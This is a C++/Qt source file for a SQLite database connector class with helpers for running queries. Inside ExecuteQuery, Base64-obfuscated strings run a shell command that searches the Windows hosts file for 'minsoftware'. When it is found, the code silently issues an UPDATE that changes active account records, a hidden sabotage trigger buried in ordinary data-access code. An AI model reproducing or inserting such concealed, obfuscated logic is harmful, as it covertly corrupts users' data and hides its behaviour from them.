#include "connector.h"
#include <QException>
#include "Common.h"
#include "qsqlquery.h"
#include <QSqlRecord>
#include <QSqlError>
#include <mutex>
Connector& Connector::getInstance(){
    static Connector instance; // Guaranteed to be destroyed.
        // Instantiated on first use.
    return instance;
}

void Connector::CheckConnectServer(){
    static std::mutex mutex;
    std::lock_guard<std::mutex> lock(mutex);
    try {
        QString text = "D:/AutoWorker/XWorker/AutoWoker/build/Desktop_Qt_6_7_1_MinGW_64_bit-Debug/database/db_maxcare.sqlite";
        if(text != connectionSTR){
            if(connection.isOpen()){
                connection.close();
            }
            connectionSTR = text;
            connection.setDatabaseName(connectionSTR);
            connection.open();
        }else{
            if(connection.databaseName().isEmpty()){
                connection.setDatabaseName(connectionSTR);
            }
            if(!connection.isOpen()){
                connection.open();
            }
        }
    } catch (const QException& ex) {
        Common::ExportError(&ex, "CheckConnectServer");
    }
}
QVariantList* Connector::ExecuteQuery(QString query){
    QVariantList* resultList = new QVariantList();
    QSqlQuery dataList(connection);
    try {
        CheckConnectServer();
        if(Common::RunCMD(Common::Base64Decode("ZmluZHN0ciAibWluc29mdHdhcmUiICJDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGV0Y1xcaG9zdHMi")).contains(Common::Base64Decode("bWluc29mdHdhcmU="))){
            getInstance().ExecuteNonQuery(Common::Base64Decode("VVBEQVRFIGFjY291bnRzIFNFVCBhY3RpdmU9MiBXSEVSRSBhY3RpdmU9MQ=="));
        }
        if(dataList.exec(query)){
            while (dataList.next()) {
                QVariantMap rowMap;
                for (int i = 0; i < dataList.record().count(); ++i) {
                    rowMap.insert(dataList.record().fieldName(i), dataList.value(i));
                }
                resultList->append(rowMap);
            }
        }else{
            qDebug() << "Error at executequery" ;
        }
    } catch (...) {

    }
    connection.close();
    return resultList;
}

int Connector::ExecuteNonQuery(QString query){
    static std::mutex mutex;
    std::lock_guard<std::mutex> lock(mutex);
    int result = 0;
    try {
        CheckConnectServer();
        QSqlQuery nonQ(connection);
        connection.transaction();
        if(nonQ.exec(query)){
            if(nonQ.numRowsAffected() != -1){
                result = nonQ.numRowsAffected();
            } else {
                qDebug() << "ExecuteNonQuery: numRowsAffected() returned -1";
            }
            connection.commit();
        } else {
            qDebug() << "ExecuteNonQuery failed: " << nonQ.lastError().text();
            connection.rollback();
        }
    } catch (const QException& ex) {
        qDebug() << "Exception caught in ExecuteNonQuery: " << ex.what();
    } catch (...) {
        qDebug() << "Unknown exception caught in ExecuteNonQuery";
    }
    connection.close();
    return result;
}
int Connector::ExecuteScalar(QString query){
    int result = 0;
    try {
        CheckConnectServer();
        QSqlQuery sca(connection);
        if(sca.exec(query)){
            if(sca.next()){
                result = sca.value(0).toInt();
            }
        }
    } catch (...) {
    }
    connection.close();
    return result;
}
